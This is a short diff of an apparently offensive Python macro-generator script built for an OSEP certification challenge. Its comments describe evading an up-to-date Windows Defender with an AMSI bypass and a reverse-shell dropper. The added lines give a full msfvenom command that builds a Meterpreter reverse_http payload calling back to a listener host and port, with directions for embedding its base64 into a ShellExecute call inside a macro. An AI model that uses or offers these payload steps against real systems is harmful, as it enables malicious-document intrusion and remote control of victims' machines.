@@ -3,6 +3,9 @@
 # tested on up-to-date defender, but your amsi bypass and rev shell dropper will need obfusction as well
 # built this for OSEP challenge
 # more macro techniques here: https://github.com/S3cur3Th1sSh1t/OffensiveVBA
+# this can also run shellcode: 
+# run  msfvenom -p windows/meterpreter/reverse_http ARCH=x86 EXITFUNC=thread  LHOST=192.168.21.128 LPORT=444 -f vba-psh -o rev, 
+# and copy from " -nop" until end of b64 and insert it in itemObj.Document.Application.ShellExecute {zb}({zd}), RIGHT_HERE, "", "open", 0
 import random
 import string
 import base64
